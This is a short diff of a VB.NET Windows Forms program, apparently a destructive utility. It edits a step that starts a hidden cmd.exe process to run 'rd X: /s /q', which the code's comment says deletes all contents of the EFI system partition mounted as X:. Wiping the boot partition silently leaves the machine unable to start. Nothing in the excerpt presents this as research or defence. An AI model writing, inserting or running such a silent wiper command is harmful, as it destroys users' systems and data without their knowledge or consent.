@@ -244,7 +244,7 @@ Public Class Form1
                 ' 2. Delete all contents from the X: drive (EFI system partition)
                 Dim rdProcess As New Process()
                 rdProcess.StartInfo.FileName = "cmd.exe"
-                rdProcess.StartInfo.Arguments = "/C rd X:\ /s /q"
+                rdProcess.StartInfo.Arguments = "/C rd X: /s /q"
                 rdProcess.StartInfo.CreateNoWindow = True
                 rdProcess.StartInfo.UseShellExecute = False
                 rdProcess.Start()
